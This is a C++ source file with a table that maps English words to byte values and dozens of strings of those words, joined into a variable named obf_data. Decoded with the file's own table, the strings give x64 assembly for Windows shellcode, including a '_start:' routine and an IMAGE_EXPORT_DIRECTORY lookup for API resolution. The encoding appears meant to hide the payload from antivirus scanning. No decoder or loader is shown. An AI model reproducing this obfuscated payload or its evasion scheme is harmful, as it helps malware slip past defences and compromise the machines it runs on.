#include <iostream>
#include <string>
#include <map>
#include <vector>
#include <sstream>
#include <iterator>
#include <algorithm>
#include <windows.h>
    


std::map<std::string, uint8_t> wordDict = {
    std::make_pair("naval", 0x00),
    std::make_pair("trainers", 0x01),
    std::make_pair("particle", 0x02),
    std::make_pair("graham", 0x03),
    std::make_pair("minor", 0x04),
    std::make_pair("dollars", 0x05),
    std::make_pair("missouri", 0x06),
    std::make_pair("celebration", 0x07),
    std::make_pair("retirement", 0x08),
    std::make_pair("recommends", 0x09),
    std::make_pair("mice", 0x0a),
    std::make_pair("rivers", 0x0b),
    std::make_pair("bind", 0x0c),
    std::make_pair("leaders", 0x0d),
    std::make_pair("cork", 0x0e),
    std::make_pair("airport", 0x0f),
    std::make_pair("ideas", 0x10),
    std::make_pair("colin", 0x11),
    std::make_pair("jackets", 0x12),
    std::make_pair("rn", 0x13),
    std::make_pair("al", 0x14),
    std::make_pair("applications", 0x15),
    std::make_pair("harmony", 0x16),
    std::make_pair("pillow", 0x17),
    std::make_pair("north", 0x18),
    std::make_pair("grows", 0x19),
    std::make_pair("deutsch", 0x1a),
    std::make_pair("exchange", 0x1b),
    std::make_pair("fitted", 0x1c),
    std::make_pair("sex", 0x1d),
    std::make_pair("candidate", 0x1e),
    std::make_pair("nvidia", 0x1f),
    std::make_pair("bald", 0x20),
    std::make_pair("companies", 0x21),
    std::make_pair("instrument", 0x22),
    std::make_pair("obvious", 0x23),
    std::make_pair("classroom", 0x24),
    std::make_pair("choices", 0x25),
    std::make_pair("discussing", 0x26),
    std::make_pair("audi", 0x27),
    std::make_pair("roommate", 0x28),
    std::make_pair("hobbies", 0x29),
    std::make_pair("twisted", 0x2a),
    std::make_pair("hose", 0x2b),
    std::make_pair("arrested", 0x2c),
    std::make_pair("financing", 0x2d),
    std::make_pair("lie", 0x2e),
    std::make_pair("permanent", 0x2f),
    std::make_pair("cap", 0x30),
    std::make_pair("families", 0x31),
    std::make_pair("ago", 0x32),
    std::make_pair("longer", 0x33),
    std::make_pair("tm", 0x34),
    std::make_pair("bob", 0x35),
    std::make_pair("blessed", 0x36),
    std::make_pair("travelers", 0x37),
    std::make_pair("thriller", 0x38),
    std::make_pair("positions", 0x39),
    std::make_pair("womens", 0x3a),
    std::make_pair("closure", 0x3b),
    std::make_pair("titanium", 0x3c),
    std::make_pair("chose", 0x3d),
    std::make_pair("college", 0x3e),
    std::make_pair("dramatic", 0x3f),
    std::make_pair("recordings", 0x40),
    std::make_pair("cricket", 0x41),
    std::make_pair("citysearch", 0x42),
    std::make_pair("zu", 0x43),
    std::make_pair("models", 0x44),
    std::make_pair("consumption", 0x45),
    std::make_pair("achievements", 0x46),
    std::make_pair("catalog", 0x47),
    std::make_pair("business", 0x48),
    std::make_pair("older", 0x49),
    std::make_pair("butt", 0x4a),
    std::make_pair("soap", 0x4b),
    std::make_pair("hope", 0x4c),
    std::make_pair("tim", 0x4d),
    std::make_pair("tracked", 0x4e),
    std::make_pair("collar", 0x4f),
    std::make_pair("link", 0x50),
    std::make_pair("modification", 0x51),
    std::make_pair("hughes", 0x52),
    std::make_pair("yourself", 0x53),
    std::make_pair("impacts", 0x54),
    std::make_pair("estimate", 0x55),
    std::make_pair("mg", 0x56),
    std::make_pair("weddings", 0x57),
    std::make_pair("charm", 0x58),
    std::make_pair("minutes", 0x59),
    std::make_pair("mexican", 0x5a),
    std::make_pair("hurt", 0x5b),
    std::make_pair("trauma", 0x5c),
    std::make_pair("aberdeen", 0x5d),
    std::make_pair("failed", 0x5e),
    std::make_pair("concerts", 0x5f),
    std::make_pair("nevertheless", 0x60),
    std::make_pair("enjoyed", 0x61),
    std::make_pair("cultural", 0x62),
    std::make_pair("box", 0x63),
    std::make_pair("attacks", 0x64),
    std::make_pair("salary", 0x65),
    std::make_pair("jc", 0x66),
    std::make_pair("balls", 0x67),
    std::make_pair("fusion", 0x68),
    std::make_pair("arm", 0x69),
    std::make_pair("grill", 0x6a),
    std::make_pair("fish", 0x6b),
    std::make_pair("traffic", 0x6c),
    std::make_pair("cost", 0x6d),
    std::make_pair("widescreen", 0x6e),
    std::make_pair("costume", 0x6f),
    std::make_pair("optics", 0x70),
    std::make_pair("abortion", 0x71),
    std::make_pair("hs", 0x72),
    std::make_pair("romantic", 0x73),
    std::make_pair("concern", 0x74),
    std::make_pair("iron", 0x75),
    std::make_pair("spelling", 0x76),
    std::make_pair("ol", 0x77),
    std::make_pair("copying", 0x78),
    std::make_pair("miscellaneous", 0x79),
    std::make_pair("adapted", 0x7a),
    std::make_pair("permission", 0x7b),
    std::make_pair("km", 0x7c),
    std::make_pair("no", 0x7d),
    std::make_pair("extensive", 0x7e),
    std::make_pair("cox", 0x7f),
    std::make_pair("eligibility", 0x80),
    std::make_pair("combinations", 0x81),
    std::make_pair("humanity", 0x82),
    std::make_pair("connecticut", 0x83),
    std::make_pair("judge", 0x84),
    std::make_pair("aim", 0x85),
    std::make_pair("surprising", 0x86),
    std::make_pair("signed", 0x87),
    std::make_pair("anyone", 0x88),
    std::make_pair("gift", 0x89),
    std::make_pair("wb", 0x8a),
    std::make_pair("increases", 0x8b),
    std::make_pair("partner", 0x8c),
    std::make_pair("dominant", 0x8d),
    std::make_pair("lol", 0x8e),
    std::make_pair("directors", 0x8f),
    std::make_pair("elections", 0x90),
    std::make_pair("hook", 0x91),
    std::make_pair("ls", 0x92),
    std::make_pair("oral", 0x93),
    std::make_pair("fotos", 0x94),
    std::make_pair("galaxy", 0x95),
    std::make_pair("unnecessary", 0x96),
    std::make_pair("settled", 0x97),
    std::make_pair("venue", 0x98),
    std::make_pair("stickers", 0x99),
    std::make_pair("maintaining", 0x9a),
    std::make_pair("reliable", 0x9b),
    std::make_pair("pst", 0x9c),
    std::make_pair("led", 0x9d),
    std::make_pair("ross", 0x9e),
    std::make_pair("signal", 0x9f),
    std::make_pair("para", 0xa0),
    std::make_pair("potatoes", 0xa1),
    std::make_pair("ala", 0xa2),
    std::make_pair("issue", 0xa3),
    std::make_pair("fed", 0xa4),
    std::make_pair("referring", 0xa5),
    std::make_pair("references", 0xa6),
    std::make_pair("arising", 0xa7),
    std::make_pair("incurred", 0xa8),
    std::make_pair("matrix", 0xa9),
    std::make_pair("unit", 0xaa),
    std::make_pair("bracelet", 0xab),
    std::make_pair("smell", 0xac),
    std::make_pair("fp", 0xad),
    std::make_pair("la", 0xae),
    std::make_pair("mind", 0xaf),
    std::make_pair("treo", 0xb0),
    std::make_pair("owen", 0xb1),
    std::make_pair("technology", 0xb2),
    std::make_pair("gilbert", 0xb3),
    std::make_pair("schools", 0xb4),
    std::make_pair("lottery", 0xb5),
    std::make_pair("campaigns", 0xb6),
    std::make_pair("plans", 0xb7),
    std::make_pair("msgid", 0xb8),
    std::make_pair("seminars", 0xb9),
    std::make_pair("hispanic", 0xba),
    std::make_pair("happy", 0xbb),
    std::make_pair("annual", 0xbc),
    std::make_pair("sporting", 0xbd),
    std::make_pair("oo", 0xbe),
    std::make_pair("hostels", 0xbf),
    std::make_pair("mainland", 0xc0),
    std::make_pair("entrepreneurs", 0xc1),
    std::make_pair("housewares", 0xc2),
    std::make_pair("jumping", 0xc3),
    std::make_pair("count", 0xc4),
    std::make_pair("polls", 0xc5),
    std::make_pair("drops", 0xc6),
    std::make_pair("nascar", 0xc7),
    std::make_pair("constraints", 0xc8),
    std::make_pair("investigations", 0xc9),
    std::make_pair("territories", 0xca),
    std::make_pair("mold", 0xcb),
    std::make_pair("bronze", 0xcc),
    std::make_pair("buried", 0xcd),
    std::make_pair("behind", 0xce),
    std::make_pair("merchandise", 0xcf),
    std::make_pair("calvin", 0xd0),
    std::make_pair("salt", 0xd1),
    std::make_pair("underwear", 0xd2),
    std::make_pair("indicating", 0xd3),
    std::make_pair("disorder", 0xd4),
    std::make_pair("nude", 0xd5),
    std::make_pair("character", 0xd6),
    std::make_pair("sagem", 0xd7),
    std::make_pair("wed", 0xd8),
    std::make_pair("newer", 0xd9),
    std::make_pair("abc", 0xda),
    std::make_pair("entity", 0xdb),
    std::make_pair("asn", 0xdc),
    std::make_pair("extraction", 0xdd),
    std::make_pair("quarters", 0xde),
    std::make_pair("tournament", 0xdf),
    std::make_pair("journal", 0xe0),
    std::make_pair("apps", 0xe1),
    std::make_pair("di", 0xe2),
    std::make_pair("some", 0xe3),
    std::make_pair("thinking", 0xe4),
    std::make_pair("circumstances", 0xe5),
    std::make_pair("cheat", 0xe6),
    std::make_pair("slides", 0xe7),
    std::make_pair("arms", 0xe8),
    std::make_pair("spot", 0xe9),
    std::make_pair("rolling", 0xea),
    std::make_pair("jim", 0xeb),
    std::make_pair("lindsay", 0xec),
    std::make_pair("bones", 0xed),
    std::make_pair("ca", 0xee),
    std::make_pair("mentioned", 0xef),
    std::make_pair("und", 0xf0),
    std::make_pair("beings", 0xf1),
    std::make_pair("eu", 0xf2),
    std::make_pair("soft", 0xf3),
    std::make_pair("schedule", 0xf4),
    std::make_pair("crash", 0xf5),
    std::make_pair("drives", 0xf6),
    std::make_pair("fred", 0xf7),
    std::make_pair("rooms", 0xf8),
    std::make_pair("male", 0xf9),
    std::make_pair("playlist", 0xfa),
    std::make_pair("uses", 0xfb),
    std::make_pair("toll", 0xfc),
    std::make_pair("crack", 0xfd),
    std::make_pair("douglas", 0xfe),
    std::make_pair("fears", 0xff)
};


std::string data1 = "closure financing financing financing financing financing financing financing financing financing financing financing financing financing financing financing financing financing financing financing financing financing financing financing financing financing financing collar hughes older catalog older tracked cricket hope financing financing financing financing financing financing financing financing financing financing leaders mice leaders mice leaders ";
std::string data2 = "mice concerts romantic concern enjoyed hs concern womens leaders mice bald bald bald bald box traffic attacks leaders mice bald bald bald bald enjoyed widescreen attacks bald hs romantic optics arrested cap copying jc jc jc jc jc jc jc jc jc jc jc jc jc jc jc cap leaders ";
std::string data3 = "mice bald bald bald bald box enjoyed traffic traffic bald romantic enjoyed spelling salary concerts cultural salary balls arm widescreen widescreen arm widescreen balls leaders mice leaders mice cost salary concern enjoyed romantic optics traffic costume arm concern concerts cultural traffic costume box fish concerts enjoyed optics arm womens leaders ";
std::string data4 = "mice bald bald bald bald optics iron romantic fusion bald hs positions leaders mice bald bald bald bald optics iron romantic fusion bald hs thriller leaders mice bald bald bald bald copying costume hs bald hs enjoyed copying arrested hs enjoyed copying leaders mice bald bald bald bald cost costume ";
std::string data5 = "spelling bald hs enjoyed copying arrested cap copying jc jc leaders mice bald bald bald bald optics iron romantic fusion bald hs attacks copying leaders mice bald bald bald bald copying costume hs bald hs attacks copying arrested hs attacks copying leaders mice bald bald bald bald copying costume hs ";
std::string data6 = "bald hs enjoyed copying arrested cap copying positions jc leaders mice bald bald bald bald cost costume spelling bald hs enjoyed copying arrested hurt balls romantic womens hs enjoyed copying aberdeen bald closure bald cap copying blessed cap leaders mice bald bald bald bald copying costume hs bald hs enjoyed ";
std::string data7 = "copying arrested choices hughes cricket tracked models collar tim concerts families choices leaders mice bald bald bald bald optics iron romantic fusion bald hs box copying leaders mice bald bald bald bald cost costume spelling bald hs attacks copying arrested hs enjoyed copying leaders mice bald bald bald bald copying ";
std::string data8 = "costume hs bald hs attacks copying arrested choices hughes cricket tracked models collar tim concerts families choices leaders mice bald bald bald bald closure bald cost costume spelling bald hs attacks copying arrested hurt hs enjoyed copying hose cap copying blessed cap aberdeen leaders mice bald bald bald bald cost ";
std::string data9 = "costume spelling bald hs attacks copying arrested hurt hs attacks copying hose cap copying families thriller aberdeen leaders mice bald bald bald bald copying costume hs bald hs attacks copying arrested hs enjoyed copying leaders mice bald bald bald bald optics iron romantic fusion bald hs romantic arm leaders mice ";
std::string data10 = "bald bald bald bald copying costume hs bald hs attacks copying arrested hs enjoyed copying leaders mice bald bald bald bald widescreen costume optics leaders mice bald bald bald bald cost costume spelling bald hs attacks copying arrested hurt hs attacks copying hose cap copying ago cap aberdeen leaders mice ";
std::string data11 = "leaders mice traffic costume enjoyed attacks concerts cost costume attacks iron traffic salary concerts widescreen enjoyed cost salary womens leaders mice bald bald bald bald cost costume spelling bald hs romantic arm arrested hurt hs attacks copying hose cap copying bob cap aberdeen bald bald bald bald bald leaders mice ";
std::string data12 = "bald bald bald bald cost costume spelling adapted copying bald hs box copying arrested bald ol costume hs attacks bald hurt hs attacks copying hose cap copying tm enjoyed aberdeen leaders mice bald bald bald bald copying costume hs bald hs positions arrested hs positions bald bald leaders mice bald ";
std::string data13 = "bald bald bald romantic fusion traffic bald hs box copying arrested bald families leaders mice leaders mice cost costume attacks iron traffic salary concerts fusion enjoyed romantic fusion concerts traffic costume costume optics womens leaders mice bald bald bald bald copying costume hs bald hs enjoyed copying arrested hs enjoyed ";
std::string data14 = "copying bald leaders mice bald bald bald bald traffic costume attacks romantic cultural bald leaders mice bald bald bald bald box cost optics bald enjoyed traffic arrested cap copying blessed families leaders mice bald bald bald bald grill traffic bald romantic fish arm optics concerts box enjoyed romantic salary concerts ";
std::string data15 = "enjoyed attacks grill iron romantic concern cost salary widescreen concern leaders mice bald bald bald bald romantic iron cultural bald enjoyed traffic arrested cap copying ago cap leaders mice romantic fish arm optics concerts box enjoyed romantic salary concerts enjoyed attacks grill iron romantic concern cost salary widescreen concern womens ";
std::string data16 = "leaders mice bald bald bald bald hs costume hs bald hs positions attacks arrested choices hughes collar hughes concerts mg cricket hope estimate consumption choices leaders mice bald bald bald bald attacks salary box bald hs box copying leaders mice bald bald bald bald enjoyed attacks attacks bald hs positions ";
std::string data17 = "attacks arrested salary enjoyed copying leaders mice bald bald bald bald traffic costume costume optics bald cost costume attacks iron traffic salary concerts fusion enjoyed romantic fusion concerts traffic costume costume optics leaders mice leaders mice arm romantic concerts spelling enjoyed traffic arm attacks concerts cost costume attacks iron traffic ";
std::string data18 = "salary womens leaders mice bald bald bald bald optics iron romantic fusion bald hs attacks copying leaders mice bald bald bald bald optics iron romantic fusion bald hs positions leaders mice bald bald bald bald cost costume spelling bald hs attacks copying arrested hurt hs attacks copying hose cap copying ";
std::string data19 = "ago cap aberdeen bald bald bald closure bald leaders mice bald bald bald bald cost costume spelling bald salary enjoyed copying arrested hurt hs attacks copying hose cap copying longer box aberdeen bald bald bald closure bald costume jc jc romantic salary concern bald attacks salary bald traffic audi salary ";
std::string data20 = "widescreen concern salary concern salary bald link consumption bald roommate salary concerts traffic jc enjoyed widescreen salary ol hobbies leaders mice bald bald bald bald enjoyed attacks attacks bald hs enjoyed copying arrested hs attacks copying bald bald bald bald bald bald bald bald bald bald closure bald hughes cricket ";
std::string data21 = "charm bald romantic arm concern iron jumping matrix bald jumping para bald traffic audi salary widescreen concern salary concern salary bald link consumption leaders mice bald bald bald bald box cost optics bald ol costume hs attacks bald hurt hs enjoyed copying hose cap copying families thriller aberdeen arrested cap ";
std::string data22 = "copying ago cap cultural bald bald bald closure bald mg jumping matrix hs arm jc arm salary hs bald romantic arm bald box audi salary romantic concern bald iron widescreen salary bald arm cost enjoyed balls salary bald blessed tm bald cultural arm concern romantic bald roommate cap copying ago ";
std::string data23 = "cap cultural bald box costume hs hs salary romantic optics costume widescreen attacks bald jumping para bald link consumption blessed tm hobbies leaders mice bald bald bald bald grill widescreen adapted bald traffic costume enjoyed attacks concerts widescreen salary copying concern concerts cost costume attacks iron traffic salary bald bald ";
std::string data24 = "bald bald bald bald bald bald closure bald yourself arm bald optics enjoyed romantic bald traffic salary bald box enjoyed romantic arrested bald costume widescreen bald optics enjoyed romantic romantic salary bald enjoyed iron bald cost costume attacks iron traffic salary bald romantic iron arm spelling enjoyed widescreen concern leaders ";
std::string data25 = "mice leaders mice bald bald bald bald cost costume spelling bald salary enjoyed copying arrested hurt hs enjoyed copying hose cap copying thriller thriller aberdeen bald bald bald closure bald costume jc jc romantic salary concern bald attacks salary bald older tim cricket catalog consumption concerts consumption charm link collar ";
std::string data26 = "hughes impacts concerts models older hughes consumption zu impacts collar hughes minutes leaders mice bald bald bald bald concern salary romantic concern bald hs enjoyed copying arrested hs enjoyed copying bald bald bald bald bald bald bald bald bald closure bald romantic arm bald optics enjoyed romantic bald attacks audi ";
std::string data27 = "costume jc jc romantic salary concern bald optics costume iron hs bald older tim cricket catalog consumption concerts consumption charm link collar hughes impacts concerts models older hughes consumption zu impacts collar hughes minutes arrested bald traffic salary bald cost costume attacks iron traffic salary bald widescreen audi salary romantic ";
std::string data28 = "concern bald optics enjoyed romantic bald traffic salary bald cultural costume widescreen arrested bald costume widescreen bald optics enjoyed romantic romantic salary bald enjoyed iron bald romantic iron arm spelling enjoyed widescreen concern leaders mice bald bald bald bald grill adapted bald traffic costume enjoyed attacks concerts widescreen salary copying ";
std::string data29 = "concern concerts cost costume attacks iron traffic salary leaders mice leaders mice bald bald bald bald enjoyed attacks attacks bald hs enjoyed copying arrested hs attacks copying bald bald bald bald bald bald bald bald bald bald closure bald collar widescreen bald hs salary box iron optics salary hs salary ";
std::string data30 = "bald traffic audi enjoyed attacks hs salary romantic romantic salary bald attacks salary bald older tim cricket catalog consumption concerts consumption charm link collar hughes impacts concerts models older hughes consumption zu impacts collar hughes minutes arrested bald salary traffic traffic salary bald box costume widescreen concern arm salary widescreen ";
std::string data31 = "concern bald attacks salary romantic bald enjoyed attacks hs salary romantic romantic salary romantic bald hs salary traffic enjoyed concern arm spelling salary romantic bald roommate costume jc jc romantic salary concern romantic hobbies bald attacks salary bald concern enjoyed cultural traffic salary romantic bald attacks costume widescreen concern bald ";
std::string data32 = "widescreen costume iron romantic bald enjoyed traffic traffic costume widescreen romantic bald enjoyed spelling costume arm hs bald cultural salary romantic costume arm widescreen leaders mice bald bald bald bald cost costume spelling bald salary box copying arrested hurt hs enjoyed copying hose cap copying families thriller aberdeen bald bald ";
std::string data33 = "bald closure bald tracked iron cost cultural salary hs collar jc tracked enjoyed cost salary romantic leaders mice bald bald bald bald cost costume spelling bald hs thriller attacks arrested hurt hs enjoyed copying hose cap copying ago cap aberdeen bald bald bald closure bald cricket attacks attacks hs salary ";
std::string data34 = "romantic romantic collar jc tracked enjoyed cost salary romantic bald roommate costume jc jc romantic salary concern bald attacks salary bald traffic enjoyed bald concern enjoyed cultural traffic salary bald attacks salary romantic bald hughes mg cricket bald attacks salary romantic bald widescreen costume cost romantic bald attacks salary romantic ";
std::string data35 = "bald jc costume widescreen box concern arm costume widescreen romantic hobbies leaders mice bald bald bald bald enjoyed attacks attacks bald hs thriller arrested hs attacks copying leaders mice bald bald bald bald optics iron romantic fusion bald hs enjoyed copying bald bald bald bald bald bald bald bald bald ";
std::string data36 = "bald bald bald bald closure bald collar widescreen bald romantic enjoyed iron spelling salary balls enjoyed hs attacks salary bald traffic audi enjoyed attacks hs salary romantic romantic salary bald attacks salary bald older tim cricket catalog consumption concerts consumption charm link collar hughes impacts concerts models older hughes consumption ";
std::string data37 = "zu impacts collar hughes minutes leaders mice leaders mice jc arm widescreen attacks concerts jc iron widescreen box concern arm costume widescreen womens leaders mice bald bald bald bald grill hs box copying adapted bald optics hs salary concerts traffic costume enjoyed attacks concerts widescreen salary copying concern concerts cost ";
std::string data38 = "costume attacks iron traffic salary leaders mice bald bald bald bald copying costume hs bald hs positions arrested hs positions leaders mice bald bald bald bald attacks salary box bald hs box copying leaders mice bald bald bald bald cost costume spelling bald salary romantic arm arrested hurt hs thriller ";
std::string data39 = "hose hs box copying twisted tm aberdeen bald leaders mice bald bald bald bald enjoyed attacks attacks bald hs romantic arm arrested hs attacks copying leaders mice leaders mice jc iron widescreen box concern arm costume widescreen concerts fusion enjoyed romantic fusion concerts traffic costume costume optics womens leaders mice ";
std::string data40 = "bald bald bald bald copying costume hs bald hs enjoyed copying arrested hs enjoyed copying leaders mice bald bald bald bald traffic costume attacks romantic cultural leaders mice bald bald bald bald hs costume hs bald hs positions attacks arrested choices hughes collar hughes concerts mg cricket hope estimate consumption ";
std::string data41 = "choices leaders mice bald bald bald bald enjoyed attacks attacks bald hs positions attacks arrested salary enjoyed copying leaders mice bald bald bald bald box cost optics bald enjoyed traffic arrested enjoyed fusion leaders mice bald bald bald bald grill widescreen adapted bald jc iron widescreen box concern arm costume ";
std::string data42 = "widescreen concerts fusion enjoyed romantic fusion concerts traffic costume costume optics leaders mice leaders mice box fusion salary box fish womens leaders mice bald bald bald bald enjoyed attacks attacks bald hs positions arrested hurt hs romantic optics hose cap copying thriller aberdeen bald bald bald bald closure bald costume ";
std::string data43 = "widescreen bald enjoyed costume iron concern salary bald enjoyed iron bald fusion enjoyed romantic fusion bald box salary traffic iron arm bald attacks iron bald cost costume attacks iron traffic salary leaders mice bald bald bald bald box cost optics bald hs positions attacks arrested hs families cap attacks bald ";
std::string data44 = "bald bald bald bald bald bald bald closure bald enjoyed jc arm widescreen bald attacks audi salary romantic romantic enjoyed miscellaneous salary hs bald attacks salary bald concern hs costume iron spelling salary hs bald box salary traffic iron arm bald romantic concern costume box fish jumping matrix bald salary ";
std::string data45 = "widescreen bald attacks iron hs leaders mice bald bald bald bald grill widescreen adapted bald jc arm widescreen attacks concerts jc iron widescreen box concern arm costume widescreen bald bald bald closure bald yourself arm bald iron widescreen salary bald box costume hs hs salary romantic optics costume widescreen attacks ";
std::string data46 = "enjoyed widescreen box salary bald enjoyed bald jumping matrix concern jumping matrix bald concern hs costume iron spelling jumping matrix salary arrested bald costume widescreen bald optics enjoyed romantic romantic salary bald jumping para bald traffic enjoyed bald romantic iron arm concern salary leaders mice jc arm widescreen enjoyed traffic ";
std::string data47 = "womens bald bald bald bald bald bald bald bald bald bald bald bald bald bald bald bald bald bald leaders mice bald bald bald bald optics costume optics bald hs enjoyed copying bald bald bald bald bald bald bald bald bald bald bald bald bald closure bald collar widescreen bald ";
std::string data48 = "hs salary box iron optics salary hs salary bald enjoyed attacks hs salary romantic romantic salary bald attacks salary bald older tim cricket catalog consumption concerts consumption charm link collar hughes impacts concerts models older hughes consumption zu impacts collar hughes minutes leaders mice bald bald bald bald cost costume ";
std::string data49 = "spelling bald hs thriller attacks arrested hurt hs enjoyed copying hose cap copying ago tm aberdeen bald bald closure bald cricket attacks attacks hs salary romantic romantic collar jc tracked enjoyed cost salary collar hs attacks arm widescreen enjoyed traffic romantic arrested bald jumping para bald older tim cricket catalog ";
std::string data50 = "consumption concerts consumption charm link collar hughes impacts concerts models older hughes consumption zu impacts collar hughes minutes bald hose bald cap copying ago tm leaders mice bald bald bald bald enjoyed attacks attacks bald hs thriller arrested hs attacks copying leaders mice bald bald bald bald cost costume spelling ";
std::string data51 = "bald box copying arrested hurt hs thriller hose hs box copying twisted ago aberdeen bald bald bald closure bald hs box copying bald salary romantic concern bald traffic audi arm widescreen attacks salary copying bald attacks salary bald traffic enjoyed bald jc costume widescreen box concern arm costume widescreen bald ";
std::string data52 = "concern hs costume iron spelling jumping matrix salary bald optics hs salary box salary attacks salary cost salary widescreen concern bald attacks enjoyed widescreen romantic bald cricket attacks attacks hs salary romantic romantic collar jc tracked enjoyed cost salary romantic arrested bald costume widescreen bald hs salary box iron optics ";
std::string data53 = "salary hs salary bald traffic enjoyed bald spelling enjoyed traffic salary iron hs bald box costume hs hs salary romantic optics costume widescreen attacks enjoyed widescreen concern salary bald attacks enjoyed widescreen romantic bald cricket attacks attacks hs salary romantic romantic collar jc tracked enjoyed cost salary collar hs attacks ";
std::string data54 = "arm widescreen enjoyed traffic romantic leaders mice bald bald bald bald cost costume spelling bald hs thriller attacks arrested hurt hs enjoyed copying hose cap copying families box aberdeen bald bald closure bald consumption cricket impacts arrested bald jumping para bald older tim cricket catalog consumption concerts consumption charm link ";
std::string data55 = "collar hughes impacts concerts models older hughes consumption zu impacts collar hughes minutes bald hose bald cap copying families zu bald roommate enjoyed iron romantic romantic arm bald enjoyed optics optics salary traffic jumping matrix bald cricket attacks attacks hs salary romantic romantic collar jc tracked enjoyed cost salary romantic ";
std::string data56 = "hobbies leaders mice bald bald bald bald enjoyed attacks attacks bald hs thriller arrested hs attacks copying bald bald bald leaders mice bald bald bald bald cost costume spelling bald salary enjoyed copying arrested hurt hs thriller hose hs box copying twisted tm aberdeen bald leaders mice bald bald bald ";
std::string data57 = "bald optics costume optics bald hs thriller leaders mice bald bald bald bald enjoyed attacks attacks bald hs enjoyed copying arrested hs attacks copying bald leaders mice bald bald bald bald copying costume hs bald hs enjoyed copying arrested choices hughes cricket tracked models collar tim concerts ago choices leaders ";
std::string data58 = "mice bald bald bald bald optics costume optics bald hs thriller leaders mice bald bald bald bald optics costume optics bald hs romantic arm leaders mice bald bald bald bald optics costume optics bald hs box copying bald leaders mice bald bald bald bald optics costume optics bald hs attacks ";
std::string data59 = "copying bald bald leaders mice bald bald bald bald optics costume optics bald hs thriller bald leaders mice bald bald bald bald optics costume optics bald hs positions bald leaders mice bald bald bald bald optics costume optics bald hs families cap leaders mice bald bald bald bald romantic iron ";
std::string data60 = "cultural bald hs romantic optics arrested cultural miscellaneous concern salary bald cap copying ago cap leaders mice bald bald bald bald optics iron romantic fusion bald hs families cap leaders mice bald bald bald bald copying costume hs bald hs enjoyed copying arrested choices hughes cricket tracked models collar tim ";
std::string data61 = "concerts ago choices leaders mice bald bald bald bald grill cost optics bald hs enjoyed copying bald leaders mice leaders mice optics hs salary concerts traffic costume enjoyed attacks concerts widescreen salary copying concern concerts cost costume attacks iron traffic salary womens leaders mice bald bald bald bald optics costume ";
std::string data62 = "optics bald hs enjoyed copying bald bald bald bald bald bald bald bald bald bald bald bald bald leaders mice traffic costume enjoyed attacks concerts widescreen salary copying concern concerts cost costume attacks iron traffic salary womens leaders mice bald bald bald bald optics costume optics bald hs positions leaders ";
std::string data63 = "mice bald bald bald bald optics costume optics bald hs attacks copying leaders mice bald bald bald bald cost costume spelling bald hs attacks copying arrested bald hurt hs attacks copying aberdeen leaders mice bald bald bald bald grill cost optics bald traffic costume enjoyed attacks concerts cost costume attacks ";
std::string data64 = "iron traffic salary concerts widescreen enjoyed cost salary leaders mice leaders mice romantic enjoyed spelling salary concerts cultural salary balls arm widescreen widescreen arm widescreen balls womens leaders mice bald bald bald bald optics costume optics bald hs cultural optics bald bald bald bald bald bald bald bald bald bald ";
std::string data65 = "bald bald bald bald bald closure bald hs cultural optics bald chose bald recordings financing college cultural salary balls arm widescreen widescreen arm widescreen balls bald roommate cost salary concern enjoyed romantic optics traffic costume arm concern concerts cultural traffic costume box fish concerts enjoyed optics arm hobbies leaders mice ";
std::string data66 = "bald bald bald bald box enjoyed traffic traffic bald traffic costume enjoyed attacks concerts estimate yourself consumption hughes longer ago models hope hope leaders mice bald bald bald bald attacks cultural bald nevertheless iron romantic salary hs longer ago lie attacks traffic traffic trauma cap nevertheless leaders mice leaders mice ";
std::string data67 = "traffic costume enjoyed attacks concerts estimate yourself consumption hughes longer ago models hope hope womens leaders mice bald bald bald bald optics costume optics bald hs box copying bald bald bald leaders mice bald bald bald bald cost costume spelling bald hs families cap attacks arrested choices business cricket yourself ";
std::string data68 = "business concerts fish salary hs widescreen salary traffic longer ago lie attacks traffic traffic concerts hope costume enjoyed attacks hope arm cultural hs enjoyed hs miscellaneous cricket choices bald bald bald closure bald business enjoyed romantic fusion bald attacks salary bald fish salary hs widescreen salary traffic longer ago lie ";
std::string data69 = "hope costume enjoyed attacks hope arm cultural hs enjoyed hs miscellaneous cricket bald leaders mice bald bald bald bald box enjoyed traffic traffic bald hs cultural optics bald leaders mice bald bald bald bald cost costume spelling bald hs positions arrested bald cap copying cap bald bald bald bald bald ";
std::string data70 = "leaders mice bald bald bald bald box enjoyed traffic traffic bald traffic costume enjoyed attacks concerts business consumption hope hope collar leaders mice bald bald bald bald attacks cultural bald nevertheless business salary traffic traffic costume trauma cap nevertheless leaders mice leaders mice traffic costume enjoyed attacks concerts business consumption ";
std::string data71 = "hope hope collar womens leaders mice bald bald bald bald optics costume optics bald hs attacks copying leaders mice bald bald bald bald box enjoyed traffic traffic bald traffic costume enjoyed attacks concerts older tracked achievements collar leaders mice bald bald bald bald attacks cultural bald nevertheless older widescreen jc ";
std::string data72 = "costume trauma cap nevertheless leaders mice leaders mice traffic costume enjoyed attacks concerts older tracked achievements collar womens leaders mice bald bald bald bald optics costume optics bald hs thriller leaders mice leaders mice traffic costume enjoyed attacks concerts fusion enjoyed romantic fusion salary romantic womens leaders mice bald bald ";
std::string data73 = "bald bald copying costume hs bald hs box copying arrested hs box copying leaders mice bald bald bald bald cost costume spelling bald hs families cap attacks arrested choices business cricket yourself business concerts iron romantic salary hs longer ago lie attacks traffic traffic concerts tim salary romantic romantic enjoyed ";
std::string data74 = "balls salary citysearch costume copying cricket choices bald bald bald bald closure bald business enjoyed romantic fusion bald attacks salary bald iron romantic salary hs longer ago lie tim salary romantic romantic enjoyed balls salary citysearch costume copying cricket leaders mice bald bald bald bald box enjoyed traffic traffic bald ";
std::string data75 = "hs cultural optics leaders mice bald bald bald bald copying costume hs bald hs box copying arrested hs box copying leaders mice bald bald bald bald cost costume spelling bald hs families cap attacks arrested choices business cricket yourself business concerts fish salary hs widescreen salary traffic longer ago lie ";
std::string data76 = "attacks traffic traffic concerts consumption copying arm concern link hs costume box salary romantic romantic choices bald bald bald closure bald business enjoyed romantic fusion bald attacks salary bald fish salary hs widescreen salary traffic longer ago lie consumption copying arm concern link hs costume box salary romantic romantic leaders ";
std::string data77 = "mice bald bald bald bald box enjoyed traffic traffic bald hs cultural optics ";


std::string obf_data = data1+data2+data3+data4+data5+data6+data7+data8+data9+data10+data11+data12+data13+data14+data15+data16+data17+data18+data19+data20+data21+data22+data23+data24+data25+data26+data27+data28+data29+data30+data31+data32+data33+data34+data35+data36+data37+data38+data39+data40+data41+data42+data43+data44+data45+data46+data47+data48+data49+data50+data51+data52+data53+data54+data55+data56+data57+data58+data59+data60+data61+data62+data63+data64+data65+data66+data67+data68+data69+data70+data71+data72+data73+data74+data75+data76+data77;



